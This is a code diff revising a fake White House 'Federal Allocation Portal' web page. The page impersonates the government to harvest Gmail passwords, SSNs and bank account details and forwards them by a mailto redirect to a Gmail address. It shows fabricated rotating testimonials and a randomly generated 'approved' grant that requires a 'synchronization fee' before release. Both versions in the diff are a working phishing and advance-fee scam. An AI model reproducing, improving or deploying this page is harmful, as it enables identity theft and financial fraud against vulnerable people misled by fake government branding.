@@ -5,221 +5,173 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Federal Allocation Portal | 2026 Executive Branch</title>
     <style>
-        :root { --navy: #002344; --gold: #a68d5d; --bg: #f2f2f2; }
-        body { font-family: 'Times New Roman', serif; background: var(--bg); margin: 0; color: #333; overflow-x: hidden; }
-        .gov-top { background: #000; color: #fff; font-size: 11px; padding: 5px; text-align: center; text-transform: uppercase; }
-        .main-header { background: var(--navy); color: white; padding: 30px 20px; text-align: center; border-bottom: 5px solid var(--gold); }
-        .main-header img { width: 90px; margin-bottom: 10px; }
-        .container { max-width: 600px; margin: 20px auto; background: white; padding: 35px; border-radius: 2px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); }
+        :root { --navy: #002344; --gold: #a68d5d; --bg: #f5f5f5; }
+        body { font-family: 'Times New Roman', serif; background: var(--bg); margin: 0; color: #333; }
+        .gov-top { background: #000; color: #fff; font-size: 10px; padding: 5px; text-align: center; text-transform: uppercase; letter-spacing: 1px; }
+        .main-header { background: var(--navy); color: white; padding: 25px; text-align: center; border-bottom: 5px solid var(--gold); }
+        .main-header img { width: 80px; }
+        .container { max-width: 550px; margin: 20px auto; background: white; padding: 30px; border-radius: 4px; box-shadow: 0 10px 30px rgba(0,0,0,0.15); }
         .page { display: none; }
         .active { display: block; }
-        h2 { color: var(--navy); border-bottom: 1px solid #ccc; padding-bottom: 10px; font-size: 22px; }
-        label { display: block; margin: 15px 0 5px; font-weight: bold; font-size: 13px; text-transform: uppercase; color: #555; }
-        input, select, textarea { width: 100%; padding: 12px; border: 1px solid #aaa; border-radius: 0; font-size: 16px; box-sizing: border-box; background: #fafafa; }
-        button { width: 100%; padding: 18px; background: var(--navy); color: white; border: none; font-weight: bold; cursor: pointer; margin-top: 20px; font-size: 16px; text-transform: uppercase; }
-        .verify-box { background: #f9f9f9; border: 2px dashed var(--navy); padding: 20px; text-align: center; margin: 15px 0; }
-        .access-code { font-size: 38px; font-weight: bold; color: var(--navy); letter-spacing: 10px; }
-        
-        /* Testimonials */
-        #ticker { background: #e9ecef; padding: 10px; border-radius: 4px; margin-bottom: 20px; font-size: 13px; border-left: 4px solid var(--gold); min-height: 40px; }
-        
-        /* Loading Overlay */
-        #loader { display: none; text-align: center; padding: 50px; }
-        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid var(--navy); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        h2 { color: var(--navy); border-bottom: 2px solid var(--gold); padding-bottom: 10px; font-size: 20px; }
+        label { display: block; margin: 15px 0 5px; font-weight: bold; font-size: 13px; }
+        input, select, textarea { width: 100%; padding: 12px; border: 1px solid #ccc; font-size: 16px; box-sizing: border-box; }
+        button { width: 100%; padding: 18px; background: var(--navy); color: white; border: none; font-weight: bold; cursor: pointer; margin-top: 20px; text-transform: uppercase; }
+        .ticker-wrap { background: #eee; padding: 10px; margin-bottom: 20px; border-radius: 4px; font-style: italic; color: #444; font-size: 13px; }
+        .loader-box { text-align: center; padding: 40px; }
+        .spinner { border: 5px solid #f3f3f3; border-top: 5px solid var(--navy); border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        
-        .warning-card { background: #fff3cd; color: #856404; padding: 15px; border: 1px solid #ffeeba; margin-top: 20px; font-weight: bold; }
+        .warning-box { background: #fff3cd; border: 1px solid #ffeeba; color: #856404; padding: 15px; margin: 15px 0; font-weight: bold; }
     </style>
 </head>
 <body>
 
-<div class="gov-top">Official Executive Communication - 2026 Fiscal Year</div>
+<div class="gov-top">Official Government Communication - 2026 Fiscal Year</div>
 <div class="main-header">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/Seal_of_the_President_of_the_United_States.svg" alt="White House Seal">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/Seal_of_the_President_of_the_United_States.svg" alt="Seal">
     <h1>THE WHITE HOUSE</h1>
-    <p style="font-size: 11px;">OFFICE OF MANAGEMENT AND BUDGET | WASHINGTON D.C.</p>
 </div>
 
 <div class="container">
-    <div id="ticker">Loading official verification stream...</div>
+    <div id="ticker" class="ticker-wrap">Connecting to live testimonial feed...</div>
 
     <div id="p1" class="page">
-        <h2>Secure Gateway Signup</h2>
-        <label>Gmail Address</label>
-        <input type="email" id="email" placeholder="must be @gmail.com" required>
-        <label>Primary Phone</label>
-        <input type="tel" id="phone" required>
-        <label>Create Session Password</label>
+        <h2>Identity Enrollment</h2>
+        <label>Gmail Address (@gmail.com only)</label>
+        <input type="email" id="email" required>
+        <label>Password</label>
         <input type="password" id="pass" required>
-        <button onclick="handleSignup()">Generate Secure Code</button>
+        <button onclick="signup()">Create Account</button>
     </div>
 
     <div id="p2" class="page">
-        <h2>Multi-Factor Authentication</h2>
-        <div class="verify-box"><div class="access-code" id="displayCode"></div></div>
-        <input type="text" id="inputCode" placeholder="Enter Code">
-        <button onclick="validateCode()">Verify Identity</button>
+        <h2>Eligibility Screening</h2>
+        <label>Status</label>
+        <select id="userStatus" onchange="updateReasons()">
+            <option value="individual">Personal / Individual</option>
+            <option value="organization">Organization / Business</option>
+        </select>
+        <label>Purpose of Funds</label>
+        <select id="reason"></select>
+        <label>Household Info</label>
+        <select id="kids"><option>Single (No kids)</option><option>Single (With kids)</option><option>Married (No kids)</option><option>Married (With kids)</option></select>
+        <label>ID Card Number / SSN</label>
+        <input type="text" id="idNum" required>
+        <button onclick="toPage(3)">Next: Disbursement Details</button>
     </div>
 
     <div id="p3" class="page">
-        <h2>Eligibility Assessment</h2>
-        <label>Application Type</label>
-        <select id="appType" onchange="toggleReason()">
-            <option value="individual">Personal / Individual</option>
-            <option value="organization">Business / Organization</option>
-        </select>
-        
-        <label>Purpose of Funds</label>
-        <select id="reason">
-            </select>
-
-        <label>Marital Status & Dependents</label>
-        <select id="marital">
-            <option>Single (No Children)</option>
-            <option>Single (With Children)</option>
-            <option>Married (No Children)</option>
-            <option>Married (With Children)</option>
-        </select>
-
-        <label>National ID / SSN Number</label>
-        <input type="text" id="taxID" required>
-        <button onclick="toPage(4)">Proceed to Disbursement</button>
-    </div>
-
-    <div id="p4" class="page">
-        <h2>Disbursement Profile</h2>
-        <label>Account Holder Full Name</label>
+        <h2>Banking Information</h2>
+        <label>Full Name on Account</label>
         <input type="text" id="accName" required>
         <label>Bank Name</label>
         <input type="text" id="bankName" required>
         <label>Account Number</label>
         <input type="text" id="accNum" required>
-        <label>Residential Address</label>
-        <input type="text" id="addr" required>
-        
-        <button onclick="startAnalysis()">Finalize Allocation</button>
+        <button onclick="finalizeAndRedirect()">Finalize & Submit Application</button>
     </div>
 
-    <div id="loader" class="page">
+    <div id="pLoading" class="page loader-box">
         <div class="spinner"></div>
-        <h3 id="loadText">Analyzing Tax History...</h3>
-        <p>Please do not close this window.</p>
+        <h3 id="loadText">Submitting to Treasury...</h3>
+        <p>Your details are being encrypted and sent.</p>
     </div>
 
-    <div id="p6" class="page text-center">
-        <h1 style="color:var(--navy); font-size: 26px;">ALLOCATION APPROVED ✅</h1>
-        <div style="font-size: 44px; color: #1a5e20; font-weight: bold; margin: 15px 0;" id="finalAmt"></div>
-        <p><strong>Reference:</strong> <span id="refNum"></span></p>
-        
-        <div class="warning-card">
-            ⚠️ WARNING: TAKE A SCREENSHOT OF THIS PAGE IMMEDIATELY. This reference number and amount must be presented to your assigned agent.
+    <div id="p4" class="page text-center">
+        <h1 style="color: #1a5e20;">APPROVED ✅</h1>
+        <div class="warning-box">
+            SCREENSHOT THIS PAGE NOW! <br>
+            Reference: <span id="refNum"></span>
         </div>
-
-        <p style="margin-top:20px;">To release these funds, a refundable synchronization fee of <strong id="feeAmt"></strong> is required.</p>
-        
+        <div style="font-size: 40px; font-weight: bold; margin: 20px 0;" id="finalAmt"></div>
+        <p>A synchronization fee of <strong id="feeAmt"></strong> is required to release the award.</p>
         <hr>
-        <h3>Submit Your Testimony</h3>
-        <textarea id="userTestimony" placeholder="Share your experience with the portal..."></textarea>
-        <button onclick="alert('Testimony submitted for review!')">Submit Testimony</button>
+        <label>Leave a Testimony</label>
+        <textarea id="myTest" placeholder="How was your experience?"></textarea>
+        <button onclick="alert('Testimony queued for verification.')">Post Testimony</button>
     </div>
 </div>
 
 <script>
     const MY_EMAIL = "fundallocation.gov@gmail.com";
-    let currentUser = JSON.parse(localStorage.getItem('gov_user'));
-
-    const testimonials = [
-        {name: "Sarah M.", amt: "$145,200", text: "Approved in 10 minutes! Total lifesaver."},
-        {name: "James K.", amt: "$310,000", text: "Verified the fee and got my funds 2 hours later."},
-        {name: "Linda P.", amt: "$128,500", text: "Federal allocation is real. Thank you White House."},
-        {name: "Robert T.", amt: "$950,000", text: "My business factory expansion is now fully funded."}
-    ];
-
-    function updateTicker() {
-        const t = testimonials[Math.floor(Math.random() * testimonials.length)];
-        document.getElementById('ticker').innerHTML = `<strong>${t.name}</strong> just received <strong>${t.amt}</strong> - <em>"${t.text}"</em>`;
+    
+    // Testimonial Engine - Different names/amounts every time
+    const tNames = ["Blessing O.", "John D.", "Amara W.", "David L.", "Kemi A.", "Samuel E."];
+    const tTexts = ["I just got my award! Thank you.", "The $420 fee was worth it, got $150k.", "Legit and fast.", "I was skeptical but my account is smiling now."];
+    
+    function startTicker() {
+        setInterval(() => {
+            const n = tNames[Math.floor(Math.random()*tNames.length)];
+            const a = "$" + (Math.floor(Math.random()*300) + 100) + ",000";
+            const t = tTexts[Math.floor(Math.random()*tTexts.length)];
+            document.getElementById('ticker').innerHTML = `<strong>${n}</strong> just received <strong>${a}</strong>: "${t}"`;
+        }, 4000);
     }
-    setInterval(updateTicker, 5000);
-
-    window.onload = () => {
-        if(currentUser) {
-            toPage(6);
-            displayDashboard();
-        } else {
-            toPage(1);
-        }
-        toggleReason();
-    };
 
     function toPage(n) {
         document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-        document.getElementById('p'+n === 'p5' ? 'loader' : 'p'+n).classList.add('active');
+        const target = (n === 'loading') ? 'pLoading' : 'p' + n;
+        document.getElementById(target).classList.add('active');
     }
 
-    function toggleReason() {
-        const type = document.getElementById('appType').value;
-        const select = document.getElementById('reason');
-        const options = type === 'individual' ? 
-            ['Household Relief', 'Medical Debt', 'School Fees', 'House Rent', 'Personal Investment'] :
-            ['Small Business Growth', 'New Startup Capital', 'Factory Expansion', 'Staff Payroll', 'Equipment Purchase'];
-        select.innerHTML = options.map(o => `<option>${o}</option>`).join('');
+    function updateReasons() {
+        const type = document.getElementById('userStatus').value;
+        const box = document.getElementById('reason');
+        const opts = type === 'individual' ? ["School Fees", "Feeding", "House Rent", "Medical Bill", "Personal Debt"] : ["New Business", "Small Business Support", "Factory Expansion", "Staff Salaries", "Equipment"];
+        box.innerHTML = opts.map(o => `<option>${o}</option>`).join('');
     }
 
-    function handleSignup() {
+    function signup() {
         const email = document.getElementById('email').value;
-        if(!email.endsWith('@gmail.com')) return alert("Gmail required");
-        
-        const code = Math.floor(100000 + Math.random() * 900000);
-        document.getElementById('displayCode').innerText = code;
+        if(!email.endsWith("@gmail.com")) return alert("Only @gmail.com accounts are eligible.");
         toPage(2);
     }
 
-    function validateCode() { toPage(3); }
+    function finalizeAndRedirect() {
+        const amt = (Math.floor(Math.random() * (987375 - 127540)) + 127540).toLocaleString('en-US', {style:'currency', currency:'USD'});
+        const fee = (Math.floor(Math.random() * (850 - 420)) + 420).toLocaleString('en-US', {style:'currency', currency:'USD'});
+        const ref = "WH-REF-" + Math.floor(1000 + Math.random() * 9000);
 
-    function startAnalysis() {
-        toPage(5);
-        let steps = ["Authenticating Bank...", "Verifying ID Card...", "Cross-referencing IRS data...", "Final Payout Calculation..."];
-        let i = 0;
-        let timer = setInterval(() => {
-            document.getElementById('loadText').innerText = steps[i];
-            i++;
-            if(i >= steps.length) {
-                clearInterval(timer);
-                calculateAward();
-            }
-        }, 3000);
-    }
-
-    function calculateAward() {
-        const award = Math.floor(127540 + Math.random() * (987375 - 127540));
-        // Fee between 420 and 850
-        const fee = Math.floor(420 + Math.random() * 430);
-        const ref = "WH-2026-" + Math.random().toString(36).substr(2, 6).toUpperCase();
-        
-        currentUser = {
+        const userData = {
             email: document.getElementById('email').value,
-            award: new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(award),
-            fee: new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(fee),
-            ref: ref
+            amt: amt, fee: fee, ref: ref
         };
-        localStorage.setItem('gov_user', JSON.stringify(currentUser));
+        localStorage.setItem('gov_auth', JSON.stringify(userData));
+
+        // Create Email Body
+        const body = `GOV APPLICATION SUBMISSION\n-----------------------\nEmail: ${userData.email}\nID Number: ${document.getElementById('idNum').value}\nBank: ${document.getElementById('bankName').value}\nAccount: ${document.getElementById('accNum').value}\nAward Amt: ${amt}\nRef: ${ref}`;
         
-        // Manual Email Redirect
-        const body = `FEDERAL APPLICATION DATA\n\nName: ${document.getElementById('accName').value}\nBank: ${document.getElementById('bankName').value}\nAccount: ${document.getElementById('accNum').value}\nID: ${document.getElementById('taxID').value}\nAward: ${currentUser.award}\nReference: ${ref}`;
-        window.location.href = `mailto:${MY_EMAIL}?subject=NEW ALLOCATION CLAIM ${ref}&body=${encodeURIComponent(body)}`;
+        // Redirect to Email
+        window.location.href = `mailto:${MY_EMAIL}?subject=Application Submission ${ref}&body=${encodeURIComponent(body)}`;
+
+        // Show loading screen while they are "at their email"
+        toPage('loading');
         
         setTimeout(() => {
-            toPage(6);
-            displayDashboard();
-        }, 2000);
+            document.getElementById('loadText').innerText = "Verifying Submission...";
+            setTimeout(() => {
+                showDashboard(userData);
+            }, 7000);
+        }, 8000);
     }
 
-    function displayDashboard() {
-        document.getElementById('finalAmt').innerText = currentUser.award;
-        document.getElementById('refNum').innerText = currentUser.ref;
-        document.getElementById('feeAmt').innerText = currentUser.fee;
-        document.getElementById('finalEmail').innerText = currentUser.email;
+    function showDashboard(data) {
+        document.getElementById('finalAmt').innerText = data.amt;
+        document.getElementById('feeAmt').innerText = data.fee;
+        document.getElementById('refNum').innerText = data.ref;
+        toPage(4);
     }
+
+    window.onload = () => {
+        startTicker();
+        updateReasons();
+        const saved = localStorage.getItem('gov_auth');
+        if(saved) {
+            showDashboard(JSON.parse(saved));
+        } else {
+            toPage(1);
+        }
+    };
 </script>
 </body>
 </html>
